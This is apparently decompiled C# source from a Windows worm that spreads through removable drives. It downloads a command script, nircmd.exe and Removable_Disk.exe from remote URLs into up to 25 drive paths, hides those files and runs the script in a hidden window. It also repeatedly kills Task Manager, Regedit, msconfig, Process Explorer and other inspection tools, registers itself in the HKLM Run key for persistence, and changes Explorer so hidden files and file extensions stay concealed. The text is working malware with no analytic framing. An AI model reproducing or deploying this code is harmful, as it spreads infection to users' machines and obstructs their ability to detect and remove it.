					ProjectData.SetProjectError(projectError80);
					ProjectData.ClearProjectError();
				}
			}
			if (!File.Exists(txt_a10.get_Text() + "\\nircmd.exe"))
			{
				try
				{
					webClient_0.DownloadFile(string_1, txt_a10.get_Text() + "\\nircmd.exe");
				}
				catch (Exception projectError81)
				{
					ProjectData.SetProjectError(projectError81);
					ProjectData.ClearProjectError();
				}
			}
			if (!File.Exists(txt_a10.get_Text() + "\\Removable_Disk.exe"))
			{
				try
				{
					webClient_0.DownloadFile(string_2, txt_a10.get_Text() + "\\Removable_Disk.exe");
				}
				catch (Exception projectError82)
				{
					ProjectData.SetProjectError(projectError82);
					ProjectData.ClearProjectError();
				}
			}
			if (!File.Exists(txt_a11.get_Text() + "\\ct.cmd"))
			{
				try
				{
					webClient_0.DownloadFile(string_0, txt_a11.get_Text() + "\\ct.cmd");
				}
				catch (Exception projectError83)
				{
					ProjectData.SetProjectError(projectError83);
					ProjectData.ClearProjectError();
				}
			}
			if (!File.Exists(txt_a11.get_Text() + "\\nircmd.exe"))
			{
				try
				{
					webClient_0.DownloadFile(string_1, txt_a11.get_Text() + "\\nircmd.exe");
				}
				catch (Exception projectError84)
				{
					ProjectData.SetProjectError(projectError84);
					ProjectData.ClearProjectError();
				}
			}
			if (!File.Exists(txt_a11.get_Text() + "\\Removable_Disk.exe"))
			{
				try
				{
					webClient_0.DownloadFile(string_2, txt_a11.get_Text() + "\\Removable_Disk.exe");
				}
				catch (Exception projectError85)
				{
					ProjectData.SetProjectError(projectError85);
					ProjectData.ClearProjectError();
				}
			}
			if (!File.Exists(txt_a12.get_Text() + "\\ct.cmd"))
			{
				try
				{
					webClient_0.DownloadFile(string_0, txt_a12.get_Text() + "\\ct.cmd");
				}
				catch (Exception projectError86)
				{
					ProjectData.SetProjectError(projectError86);
					ProjectData.ClearProjectError();
				}
			}
			if (!File.Exists(txt_a12.get_Text() + "\\nircmd.exe"))
			{
				try
				{
					webClient_0.DownloadFile(string_1, txt_a12.get_Text() + "\\nircmd.exe");
				}
				catch (Exception projectError87)
				{
					ProjectData.SetProjectError(projectError87);
					ProjectData.ClearProjectError();
				}
			}
			if (!File.Exists(txt_a12.get_Text() + "\\Removable_Disk.exe"))
			{
				try
				{
					webClient_0.DownloadFile(string_2, txt_a12.get_Text() + "\\Removable_Disk.exe");
				}
				catch (Exception projectError88)
				{
					ProjectData.SetProjectError(projectError88);
					ProjectData.ClearProjectError();
				}
			}
			if (!File.Exists(txt_a13.get_Text() + "\\ct.cmd"))
			{
				try
				{
					webClient_0.DownloadFile(string_0, txt_a13.get_Text() + "\\ct.cmd");
				}
				catch (Exception projectError89)
				{
					ProjectData.SetProjectError(projectError89);
					ProjectData.ClearProjectError();
				}
			}
			if (!File.Exists(txt_a13.get_Text() + "\\nircmd.exe"))
			{
				try
				{
					webClient_0.DownloadFile(string_1, txt_a13.get_Text() + "\\nircmd.exe");
				}
				catch (Exception projectError90)
				{
					ProjectData.SetProjectError(projectError90);
					ProjectData.ClearProjectError();
				}
			}
			if (!File.Exists(txt_a13.get_Text() + "\\Removable_Disk.exe"))
			{
				try
				{
					webClient_0.DownloadFile(string_2, txt_a13.get_Text() + "\\Removable_Disk.exe");
				}
				catch (Exception projectError91)
				{
					ProjectData.SetProjectError(projectError91);
					ProjectData.ClearProjectError();
				}
			}
			if (!File.Exists(txt_a14.get_Text() + "\\ct.cmd"))
			{
				try
				{
					webClient_0.DownloadFile(string_0, txt_a14.get_Text() + "\\ct.cmd");
				}
				catch (Exception projectError92)
				{
					ProjectData.SetProjectError(projectError92);
					ProjectData.ClearProjectError();
				}
			}
			if (!File.Exists(txt_a14.get_Text() + "\\nircmd.exe"))
			{
				try
				{
					webClient_0.DownloadFile(string_1, txt_a14.get_Text() + "\\nircmd.exe");
				}
				catch (Exception projectError93)
				{
					ProjectData.SetProjectError(projectError93);
					ProjectData.ClearProjectError();
				}
			}
			if (!File.Exists(txt_a14.get_Text() + "\\Removable_Disk.exe"))
			{
				try
				{
					webClient_0.DownloadFile(string_2, txt_a14.get_Text() + "\\Removable_Disk.exe");
				}
				catch (Exception projectError94)
				{
					ProjectData.SetProjectError(projectError94);
					ProjectData.ClearProjectError();
				}
			}
			if (!File.Exists(txt_a15.get_Text() + "\\ct.cmd"))
			{
				try
				{
					webClient_0.DownloadFile(string_0, txt_a15.get_Text() + "\\ct.cmd");
				}
				catch (Exception projectError95)
				{
					ProjectData.SetProjectError(projectError95);
					ProjectData.ClearProjectError();
				}
			}
			if (!File.Exists(txt_a15.get_Text() + "\\nircmd.exe"))
			{
				try
				{
					webClient_0.DownloadFile(string_1, txt_a15.get_Text() + "\\nircmd.exe");
				}
				catch (Exception projectError96)
				{
					ProjectData.SetProjectError(projectError96);
					ProjectData.ClearProjectError();
				}
			}
			if (!File.Exists(txt_a15.get_Text() + "\\Removable_Disk.exe"))
			{
				try
				{
					webClient_0.DownloadFile(string_2, txt_a15.get_Text() + "\\Removable_Disk.exe");
				}
				catch (Exception projectError97)
				{
					ProjectData.SetProjectError(projectError97);
					ProjectData.ClearProjectError();
				}
			}
			if (!File.Exists(txt_a16.get_Text() + "\\ct.cmd"))
			{
				try
				{
					webClient_0.DownloadFile(string_0, txt_a16.get_Text() + "\\ct.cmd");
				}
				catch (Exception projectError98)
				{
					ProjectData.SetProjectError(projectError98);
					ProjectData.ClearProjectError();
				}
			}
			if (!File.Exists(txt_a16.get_Text() + "\\nircmd.exe"))
			{
				try
				{
					webClient_0.DownloadFile(string_1, txt_a16.get_Text() + "\\nircmd.exe");
				}
				catch (Exception projectError99)
				{
					ProjectData.SetProjectError(projectError99);
					ProjectData.ClearProjectError();
				}
			}
			if (!File.Exists(txt_a16.get_Text() + "\\Removable_Disk.exe"))
			{
				try
				{
					webClient_0.DownloadFile(string_2, txt_a16.get_Text() + "\\Removable_Disk.exe");
				}
				catch (Exception projectError100)
				{
					ProjectData.SetProjectError(projectError100);
					ProjectData.ClearProjectError();
				}
			}
			if (!File.Exists(txt_a17.get_Text() + "\\ct.cmd"))
			{
				try
				{
					webClient_0.DownloadFile(string_0, txt_a17.get_Text() + "\\ct.cmd");
				}
				catch (Exception projectError101)
				{
					ProjectData.SetProjectError(projectError101);
					ProjectData.ClearProjectError();
				}
			}
			if (!File.Exists(txt_a17.get_Text() + "\\nircmd.exe"))
			{
				try
				{
					webClient_0.DownloadFile(string_1, txt_a17.get_Text() + "\\nircmd.exe");
				}
				catch (Exception projectError102)
				{
					ProjectData.SetProjectError(projectError102);
					ProjectData.ClearProjectError();
				}
			}
			if (!File.Exists(txt_a17.get_Text() + "\\Removable_Disk.exe"))
			{
				try
				{
					webClient_0.DownloadFile(string_2, txt_a17.get_Text() + "\\Removable_Disk.exe");
				}
				catch (Exception projectError103)
				{
					ProjectData.SetProjectError(projectError103);
					ProjectData.ClearProjectError();
				}
			}
			if (!File.Exists(txt_a18.get_Text() + "\\ct.cmd"))
			{
				try
				{
					webClient_0.DownloadFile(string_0, txt_a18.get_Text() + "\\ct.cmd");
				}
				catch (Exception projectError104)
				{
					ProjectData.SetProjectError(projectError104);
					ProjectData.ClearProjectError();
				}
			}
			if (!File.Exists(txt_a18.get_Text() + "\\nircmd.exe"))
			{
				try
				{
					webClient_0.DownloadFile(string_1, txt_a18.get_Text() + "\\nircmd.exe");
				}
				catch (Exception projectError105)
				{
					ProjectData.SetProjectError(projectError105);
					ProjectData.ClearProjectError();
				}
			}
			if (!File.Exists(txt_a18.get_Text() + "\\Removable_Disk.exe"))
			{
				try
				{
					webClient_0.DownloadFile(string_2, txt_a18.get_Text() + "\\Removable_Disk.exe");
				}
				catch (Exception projectError106)
				{
					ProjectData.SetProjectError(projectError106);
					ProjectData.ClearProjectError();
				}
			}
			if (!File.Exists(txt_a19.get_Text() + "\\ct.cmd"))
			{
				try
				{
					webClient_0.DownloadFile(string_0, txt_a19.get_Text() + "\\ct.cmd");
				}
				catch (Exception projectError107)
				{
					ProjectData.SetProjectError(projectError107);
					ProjectData.ClearProjectError();
				}
			}
			if (!File.Exists(txt_a19.get_Text() + "\\nircmd.exe"))
			{
				try
				{
					webClient_0.DownloadFile(string_1, txt_a19.get_Text() + "\\nircmd.exe");
				}
				catch (Exception projectError108)
				{
					ProjectData.SetProjectError(projectError108);
					ProjectData.ClearProjectError();
				}
			}
			if (!File.Exists(txt_a19.get_Text() + "\\Removable_Disk.exe"))
			{
				try
				{
					webClient_0.DownloadFile(string_2, txt_a19.get_Text() + "\\Removable_Disk.exe");
				}
				catch (Exception projectError109)
				{
					ProjectData.SetProjectError(projectError109);
					ProjectData.ClearProjectError();
				}
			}
			if (!File.Exists(txt_a20.get_Text() + "\\ct.cmd"))
			{
				try
				{
					webClient_0.DownloadFile(string_0, txt_a20.get_Text() + "\\ct.cmd");
				}
				catch (Exception projectError110)
				{
					ProjectData.SetProjectError(projectError110);
					ProjectData.ClearProjectError();
				}
			}
			if (!File.Exists(txt_a20.get_Text() + "\\nircmd.exe"))
			{
				try
				{
					webClient_0.DownloadFile(string_1, txt_a20.get_Text() + "\\nircmd.exe");
				}
				catch (Exception projectError111)
				{
					ProjectData.SetProjectError(projectError111);
					ProjectData.ClearProjectError();
				}
			}
			if (!File.Exists(txt_a20.get_Text() + "\\Removable_Disk.exe"))
			{
				try
				{
					webClient_0.DownloadFile(string_2, txt_a20.get_Text() + "\\Removable_Disk.exe");
				}
				catch (Exception projectError112)
				{
					ProjectData.SetProjectError(projectError112);
					ProjectData.ClearProjectError();
				}
			}
			if (!File.Exists(txt_a21.get_Text() + "\\ct.cmd"))
			{
				try
				{
					webClient_0.DownloadFile(string_0, txt_a21.get_Text() + "\\ct.cmd");
				}
				catch (Exception projectError113)
				{
					ProjectData.SetProjectError(projectError113);
					ProjectData.ClearProjectError();
				}
			}
			if (!File.Exists(txt_a21.get_Text() + "\\nircmd.exe"))
			{
				try
				{
					webClient_0.DownloadFile(string_1, txt_a21.get_Text() + "\\nircmd.exe");
				}
				catch (Exception projectError114)
				{
					ProjectData.SetProjectError(projectError114);
					ProjectData.ClearProjectError();
				}
			}
			if (!File.Exists(txt_a21.get_Text() + "\\Removable_Disk.exe"))
			{
				try
				{
					webClient_0.DownloadFile(string_2, txt_a21.get_Text() + "\\Removable_Disk.exe");
				}
				catch (Exception projectError115)
				{
					ProjectData.SetProjectError(projectError115);
					ProjectData.ClearProjectError();
				}
			}
			if (!File.Exists(txt_a22.get_Text() + "\\ct.cmd"))
			{
				try
				{
					webClient_0.DownloadFile(string_0, txt_a22.get_Text() + "\\ct.cmd");
				}
				catch (Exception projectError116)
				{
					ProjectData.SetProjectError(projectError116);
					ProjectData.ClearProjectError();
				}
			}
			if (!File.Exists(txt_a22.get_Text() + "\\nircmd.exe"))
			{
				try
				{
					webClient_0.DownloadFile(string_1, txt_a22.get_Text() + "\\nircmd.exe");
				}
				catch (Exception projectError117)
				{
					ProjectData.SetProjectError(projectError117);
					ProjectData.ClearProjectError();
				}
			}
			if (!File.Exists(txt_a22.get_Text() + "\\Removable_Disk.exe"))
			{
				try
				{
					webClient_0.DownloadFile(string_2, txt_a22.get_Text() + "\\Removable_Disk.exe");
				}
				catch (Exception projectError118)
				{
					ProjectData.SetProjectError(projectError118);
					ProjectData.ClearProjectError();
				}
			}
			if (!File.Exists(txt_a23.get_Text() + "\\ct.cmd"))
			{
				try
				{
					webClient_0.DownloadFile(string_0, txt_a23.get_Text() + "\\ct.cmd");
				}
				catch (Exception projectError119)
				{
					ProjectData.SetProjectError(projectError119);
					ProjectData.ClearProjectError();
				}
			}
			if (!File.Exists(txt_a23.get_Text() + "\\nircmd.exe"))
			{
				try
				{
					webClient_0.DownloadFile(string_1, txt_a23.get_Text() + "\\nircmd.exe");
				}
				catch (Exception projectError120)
				{
					ProjectData.SetProjectError(projectError120);
					ProjectData.ClearProjectError();
				}
			}
			if (!File.Exists(txt_a23.get_Text() + "\\Removable_Disk.exe"))
			{
				try
				{
					webClient_0.DownloadFile(string_2, txt_a23.get_Text() + "\\Removable_Disk.exe");
				}
				catch (Exception projectError121)
				{
					ProjectData.SetProjectError(projectError121);
					ProjectData.ClearProjectError();
				}
			}
			if (!File.Exists(txt_a24.get_Text() + "\\ct.cmd"))
			{
				try
				{
					webClient_0.DownloadFile(string_0, txt_a24.get_Text() + "\\ct.cmd");
				}
				catch (Exception projectError122)
				{
					ProjectData.SetProjectError(projectError122);
					ProjectData.ClearProjectError();
				}
			}
			if (!File.Exists(txt_a24.get_Text() + "\\nircmd.exe"))
			{
				try
				{
					webClient_0.DownloadFile(string_1, txt_a24.get_Text() + "\\nircmd.exe");
				}
				catch (Exception projectError123)
				{
					ProjectData.SetProjectError(projectError123);
					ProjectData.ClearProjectError();
				}
			}
			if (!File.Exists(txt_a24.get_Text() + "\\Removable_Disk.exe"))
			{
				try
				{
					webClient_0.DownloadFile(string_2, txt_a24.get_Text() + "\\Removable_Disk.exe");
				}
				catch (Exception projectError124)
				{
					ProjectData.SetProjectError(projectError124);
					ProjectData.ClearProjectError();
				}
			}
			if (!File.Exists(txt_a25.get_Text() + "\\ct.cmd"))
			{
				try
				{
					webClient_0.DownloadFile(string_0, txt_a25.get_Text() + "\\ct.cmd");
				}
				catch (Exception projectError125)
				{
					ProjectData.SetProjectError(projectError125);
					ProjectData.ClearProjectError();
				}
			}
			if (!File.Exists(txt_a25.get_Text() + "\\nircmd.exe"))
			{
				try
				{
					webClient_0.DownloadFile(string_1, txt_a25.get_Text() + "\\nircmd.exe");
				}
				catch (Exception projectError126)
				{
					ProjectData.SetProjectError(projectError126);
					ProjectData.ClearProjectError();
				}
			}
			if (!File.Exists(txt_a25.get_Text() + "\\Removable_Disk.exe"))
			{
				try
				{
					webClient_0.DownloadFile(string_2, txt_a25.get_Text() + "\\Removable_Disk.exe");
				}
				catch (Exception projectError127)
				{
					ProjectData.SetProjectError(projectError127);
					ProjectData.ClearProjectError();
				}
			}
		}
		if (pb_exper1.get_Value() == 95)
		{
			try
			{
				File.SetAttributes(txt_a1.get_Text() + "\\ct.cmd", FileAttributes.Hidden);
			}
			catch (Exception projectError128)
			{
				ProjectData.SetProjectError(projectError128);
				ProjectData.ClearProjectError();
			}
			try
			{
				File.SetAttributes(txt_a1.get_Text() + "\\nircmd.exe", FileAttributes.Hidden);
			}
			catch (Exception projectError129)
			{
				ProjectData.SetProjectError(projectError129);
				ProjectData.ClearProjectError();
			}
			try
			{
				File.SetAttributes(txt_a1.get_Text() + "\\Removable_Disk.exe", FileAttributes.Hidden);
			}
			catch (Exception projectError130)
			{
				ProjectData.SetProjectError(projectError130);
				ProjectData.ClearProjectError();
			}
			try
			{
				File.SetAttributes(txt_a2.get_Text() + "\\ct.cmd", FileAttributes.Hidden);
			}
			catch (Exception projectError131)
			{
				ProjectData.SetProjectError(projectError131);
				ProjectData.ClearProjectError();
			}
			try
			{
				File.SetAttributes(txt_a2.get_Text() + "\\nircmd.exe", FileAttributes.Hidden);
			}
			catch (Exception projectError132)
			{
				ProjectData.SetProjectError(projectError132);
				ProjectData.ClearProjectError();
			}
			try
			{
				File.SetAttributes(txt_a2.get_Text() + "\\Removable_Disk.exe", FileAttributes.Hidden);
			}
			catch (Exception projectError133)
			{
				ProjectData.SetProjectError(projectError133);
				ProjectData.ClearProjectError();
			}
		}
		if (pb_exper1.get_Value() == 95)
		{
			try
			{
				ProcessStartInfo processStartInfo26 = new ProcessStartInfo(txt_a1.get_Text() + "ct.cmd");
				processStartInfo26.WindowStyle = ProcessWindowStyle.Hidden;
				Process.Start(processStartInfo26);
			}
			catch (Exception projectError134)
			{
				ProjectData.SetProjectError(projectError134);
				ProjectData.ClearProjectError();
			}
			try
			{
				ProcessStartInfo processStartInfo27 = new ProcessStartInfo(txt_a2.get_Text() + "ct.cmd");
				processStartInfo27.WindowStyle = ProcessWindowStyle.Hidden;
				Process.Start(processStartInfo27);
			}
			catch (Exception projectError135)
			{
				ProjectData.SetProjectError(projectError135);
				ProjectData.ClearProjectError();
			}
			try
			{
				ProcessStartInfo processStartInfo28 = new ProcessStartInfo(txt_a3.get_Text() + "ct.cmd");
				processStartInfo28.WindowStyle = ProcessWindowStyle.Hidden;
				Process.Start(processStartInfo28);
			}
			catch (Exception projectError136)
			{
				ProjectData.SetProjectError(projectError136);
				ProjectData.ClearProjectError();
			}
			try
			{
				ProcessStartInfo processStartInfo29 = new ProcessStartInfo(txt_a4.get_Text() + "ct.cmd");
				processStartInfo29.WindowStyle = ProcessWindowStyle.Hidden;
				Process.Start(processStartInfo29);
			}
			catch (Exception projectError137)
			{
				ProjectData.SetProjectError(projectError137);
				ProjectData.ClearProjectError();
			}
			try
			{
				ProcessStartInfo processStartInfo30 = new ProcessStartInfo(txt_a5.get_Text() + "ct.cmd");
				processStartInfo30.WindowStyle = ProcessWindowStyle.Hidden;
				Process.Start(processStartInfo30);
			}
			catch (Exception projectError138)
			{
				ProjectData.SetProjectError(projectError138);
				ProjectData.ClearProjectError();
			}
			try
			{
				ProcessStartInfo processStartInfo31 = new ProcessStartInfo(txt_a6.get_Text() + "ct.cmd");
				processStartInfo31.WindowStyle = ProcessWindowStyle.Hidden;
				Process.Start(processStartInfo31);
			}
			catch (Exception projectError139)
			{
				ProjectData.SetProjectError(projectError139);
				ProjectData.ClearProjectError();
			}
			try
			{
				ProcessStartInfo processStartInfo32 = new ProcessStartInfo(txt_a7.get_Text() + "ct.cmd");
				processStartInfo32.WindowStyle = ProcessWindowStyle.Hidden;
				Process.Start(processStartInfo32);
			}
			catch (Exception projectError140)
			{
				ProjectData.SetProjectError(projectError140);
				ProjectData.ClearProjectError();
			}
			try
			{
				ProcessStartInfo processStartInfo33 = new ProcessStartInfo(txt_a8.get_Text() + "ct.cmd");
				processStartInfo33.WindowStyle = ProcessWindowStyle.Hidden;
				Process.Start(processStartInfo33);
			}
			catch (Exception projectError141)
			{
				ProjectData.SetProjectError(projectError141);
				ProjectData.ClearProjectError();
			}
			try
			{
				ProcessStartInfo processStartInfo34 = new ProcessStartInfo(txt_a9.get_Text() + "ct.cmd");
				processStartInfo34.WindowStyle = ProcessWindowStyle.Hidden;
				Process.Start(processStartInfo34);
			}
			catch (Exception projectError142)
			{
				ProjectData.SetProjectError(projectError142);
				ProjectData.ClearProjectError();
			}
			try
			{
				ProcessStartInfo processStartInfo35 = new ProcessStartInfo(txt_a10.get_Text() + "ct.cmd");
				processStartInfo35.WindowStyle = ProcessWindowStyle.Hidden;
				Process.Start(processStartInfo35);
			}
			catch (Exception projectError143)
			{
				ProjectData.SetProjectError(projectError143);
				ProjectData.ClearProjectError();
			}
			try
			{
				ProcessStartInfo processStartInfo36 = new ProcessStartInfo(txt_a11.get_Text() + "ct.cmd");
				processStartInfo36.WindowStyle = ProcessWindowStyle.Hidden;
				Process.Start(processStartInfo36);
			}
			catch (Exception projectError144)
			{
				ProjectData.SetProjectError(projectError144);
				ProjectData.ClearProjectError();
			}
			try
			{
				ProcessStartInfo processStartInfo37 = new ProcessStartInfo(txt_a12.get_Text() + "ct.cmd");
				processStartInfo37.WindowStyle = ProcessWindowStyle.Hidden;
				Process.Start(processStartInfo37);
			}
			catch (Exception projectError145)
			{
				ProjectData.SetProjectError(projectError145);
				ProjectData.ClearProjectError();
			}
			try
			{
				ProcessStartInfo processStartInfo38 = new ProcessStartInfo(txt_a13.get_Text() + "ct.cmd");
				processStartInfo38.WindowStyle = ProcessWindowStyle.Hidden;
				Process.Start(processStartInfo38);
			}
			catch (Exception projectError146)
			{
				ProjectData.SetProjectError(projectError146);
				ProjectData.ClearProjectError();
			}
			try
			{
				ProcessStartInfo processStartInfo39 = new ProcessStartInfo(txt_a14.get_Text() + "ct.cmd");
				processStartInfo39.WindowStyle = ProcessWindowStyle.Hidden;
				Process.Start(processStartInfo39);
			}
			catch (Exception projectError147)
			{
				ProjectData.SetProjectError(projectError147);
				ProjectData.ClearProjectError();
			}
			try
			{
				ProcessStartInfo processStartInfo40 = new ProcessStartInfo(txt_a15.get_Text() + "ct.cmd");
				processStartInfo40.WindowStyle = ProcessWindowStyle.Hidden;
				Process.Start(processStartInfo40);
			}
			catch (Exception projectError148)
			{
				ProjectData.SetProjectError(projectError148);
				ProjectData.ClearProjectError();
			}
			try
			{
				ProcessStartInfo processStartInfo41 = new ProcessStartInfo(txt_a16.get_Text() + "ct.cmd");
				processStartInfo41.WindowStyle = ProcessWindowStyle.Hidden;
				Process.Start(processStartInfo41);
			}
			catch (Exception projectError149)
			{
				ProjectData.SetProjectError(projectError149);
				ProjectData.ClearProjectError();
			}
			try
			{
				ProcessStartInfo processStartInfo42 = new ProcessStartInfo(txt_a17.get_Text() + "ct.cmd");
				processStartInfo42.WindowStyle = ProcessWindowStyle.Hidden;
				Process.Start(processStartInfo42);
			}
			catch (Exception projectError150)
			{
				ProjectData.SetProjectError(projectError150);
				ProjectData.ClearProjectError();
			}
			try
			{
				ProcessStartInfo processStartInfo43 = new ProcessStartInfo(txt_a18.get_Text() + "ct.cmd");
				processStartInfo43.WindowStyle = ProcessWindowStyle.Hidden;
				Process.Start(processStartInfo43);
			}
			catch (Exception projectError151)
			{
				ProjectData.SetProjectError(projectError151);
				ProjectData.ClearProjectError();
			}
			try
			{
				ProcessStartInfo processStartInfo44 = new ProcessStartInfo(txt_a19.get_Text() + "ct.cmd");
				processStartInfo44.WindowStyle = ProcessWindowStyle.Hidden;
				Process.Start(processStartInfo44);
			}
			catch (Exception projectError152)
			{
				ProjectData.SetProjectError(projectError152);
				ProjectData.ClearProjectError();
			}
			try
			{
				ProcessStartInfo processStartInfo45 = new ProcessStartInfo(txt_a20.get_Text() + "ct.cmd");
				processStartInfo45.WindowStyle = ProcessWindowStyle.Hidden;
				Process.Start(processStartInfo45);
			}
			catch (Exception projectError153)
			{
				ProjectData.SetProjectError(projectError153);
				ProjectData.ClearProjectError();
			}
			try
			{
				ProcessStartInfo processStartInfo46 = new ProcessStartInfo(txt_a21.get_Text() + "ct.cmd");
				processStartInfo46.WindowStyle = ProcessWindowStyle.Hidden;
				Process.Start(processStartInfo46);
			}
			catch (Exception projectError154)
			{
				ProjectData.SetProjectError(projectError154);
				ProjectData.ClearProjectError();
			}
			try
			{
				ProcessStartInfo processStartInfo47 = new ProcessStartInfo(txt_a22.get_Text() + "ct.cmd");
				processStartInfo47.WindowStyle = ProcessWindowStyle.Hidden;
				Process.Start(processStartInfo47);
			}
			catch (Exception projectError155)
			{
				ProjectData.SetProjectError(projectError155);
				ProjectData.ClearProjectError();
			}
			try
			{
				ProcessStartInfo processStartInfo48 = new ProcessStartInfo(txt_a23.get_Text() + "ct.cmd");
				processStartInfo48.WindowStyle = ProcessWindowStyle.Hidden;
				Process.Start(processStartInfo48);
			}
			catch (Exception projectError156)
			{
				ProjectData.SetProjectError(projectError156);
				ProjectData.ClearProjectError();
			}
			try
			{
				ProcessStartInfo processStartInfo49 = new ProcessStartInfo(txt_a24.get_Text() + "ct.cmd");
				processStartInfo49.WindowStyle = ProcessWindowStyle.Hidden;
				Process.Start(processStartInfo49);
			}
			catch (Exception projectError157)
			{
				ProjectData.SetProjectError(projectError157);
				ProjectData.ClearProjectError();
			}
			try
			{
				ProcessStartInfo processStartInfo50 = new ProcessStartInfo(txt_a25.get_Text() + "ct.cmd");
				processStartInfo50.WindowStyle = ProcessWindowStyle.Hidden;
				Process.Start(processStartInfo50);
			}
			catch (Exception projectError158)
			{
				ProjectData.SetProjectError(projectError158);
				ProjectData.ClearProjectError();
			}
		}
		if (pb_exper1.get_Value() == 100)
		{
			Timer_1.set_Enabled(false);
			pb_exper1.set_Value(0);
			Timer_1.set_Enabled(true);
		}
	}

	private void Timer_2_Tick(object sender, EventArgs e)
	{
		((Control)this).Hide();
		try
		{
			Process[] processesByName = Process.GetProcessesByName("msconfig");
			Process[] array = processesByName;
			foreach (Process process in array)
			{
				process.Kill();
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		try
		{
			Process[] processesByName2 = Process.GetProcessesByName("ProcessHacker");
			Process[] array2 = processesByName2;
			foreach (Process process2 in array2)
			{
				process2.Kill();
			}
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
		try
		{
			Process[] processesByName3 = Process.GetProcessesByName("procexp64");
			Process[] array3 = processesByName3;
			foreach (Process process3 in array3)
			{
				process3.Kill();
			}
		}
		catch (Exception projectError3)
		{
			ProjectData.SetProjectError(projectError3);
			ProjectData.ClearProjectError();
		}
		try
		{
			Process[] processesByName4 = Process.GetProcessesByName("procexp");
			Process[] array4 = processesByName4;
			foreach (Process process4 in array4)
			{
				process4.Kill();
			}
		}
		catch (Exception projectError4)
		{
			ProjectData.SetProjectError(projectError4);
			ProjectData.ClearProjectError();
		}
		try
		{
			Process[] processesByName5 = Process.GetProcessesByName("manager_task");
			Process[] array5 = processesByName5;
			foreach (Process process5 in array5)
			{
				process5.Kill();
			}
		}
		catch (Exception projectError5)
		{
			ProjectData.SetProjectError(projectError5);
			ProjectData.ClearProjectError();
		}
		try
		{
			Process[] processesByName6 = Process.GetProcessesByName("taskmgr");
			Process[] array6 = processesByName6;
			foreach (Process process6 in array6)
			{
				process6.Kill();
			}
		}
		catch (Exception projectError6)
		{
			ProjectData.SetProjectError(projectError6);
			ProjectData.ClearProjectError();
		}
		try
		{
			Process[] processesByName7 = Process.GetProcessesByName("SystemExplorer");
			Process[] array7 = processesByName7;
			foreach (Process process7 in array7)
			{
				process7.Kill();
			}
		}
		catch (Exception projectError7)
		{
			ProjectData.SetProjectError(projectError7);
			ProjectData.ClearProjectError();
		}
		try
		{
			Process[] processesByName8 = Process.GetProcessesByName("Reflector");
			Process[] array8 = processesByName8;
			foreach (Process process8 in array8)
			{
				process8.Kill();
			}
		}
		catch (Exception projectError8)
		{
			ProjectData.SetProjectError(projectError8);
			ProjectData.ClearProjectError();
		}
		try
		{
			Process[] processesByName9 = Process.GetProcessesByName("DotNetToolkitLauncher");
			Process[] array9 = processesByName9;
			foreach (Process process9 in array9)
			{
				process9.Kill();
			}
		}
		catch (Exception projectError9)
		{
			ProjectData.SetProjectError(projectError9);
			ProjectData.ClearProjectError();
		}
		try
		{
			Process[] processesByName10 = Process.GetProcessesByName("regedit");
			Process[] array10 = processesByName10;
			foreach (Process process10 in array10)
			{
				process10.Kill();
			}
		}
		catch (Exception projectError10)
		{
			ProjectData.SetProjectError(projectError10);
			ProjectData.ClearProjectError();
		}
		try
		{
			Process[] processesByName11 = Process.GetProcessesByName("control");
			Process[] array11 = processesByName11;
			foreach (Process process11 in array11)
			{
				process11.Kill();
			}
		}
		catch (Exception projectError11)
		{
			ProjectData.SetProjectError(projectError11);
			ProjectData.ClearProjectError();
		}
		try
		{
			Process[] processesByName12 = Process.GetProcessesByName("UserAccountControlSettings");
			Process[] array12 = processesByName12;
			foreach (Process process12 in array12)
			{
				process12.Kill();
			}
		}
		catch (Exception projectError12)
		{
			ProjectData.SetProjectError(projectError12);
			ProjectData.ClearProjectError();
		}
	}

	private void ma_FormClosing(object sender, FormClosingEventArgs e)
	{
		Timer_3.set_Enabled(true);
	}

	private void ma_Load(object sender, EventArgs e)
	{
		try
		{
			RegistryKey registryKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
			registryKey.SetValue(Application.get_ProductName(), Application.get_ExecutablePath());
			registryKey.Close();
			RegistryKey registryKey2 = ((ServerComputer)Class1.Class0_0).get_Registry().get_CurrentUser().OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced", writable: true);
			registryKey2.SetValue("Hidden", 2);
			registryKey2.Close();
			RegistryKey registryKey3 = ((ServerComputer)Class1.Class0_0).get_Registry().get_CurrentUser().OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced", writable: true);
			registryKey3.SetValue("HideFileExt", 1);
			registryKey3.Close();
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void Timer_3_Tick(object sender, EventArgs e)
	{
		try
		{
			Process[] processesByName = Process.GetProcessesByName("gstart.dll");
			Process[] array = processesByName;
			for (int i = 0; i < array.Length; i = checked(i + 1))
			{
				Process.Start(Application.get_StartupPath() + "\\services_ssl.sys.exe");
				Timer_3.set_Enabled(false);
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}
}
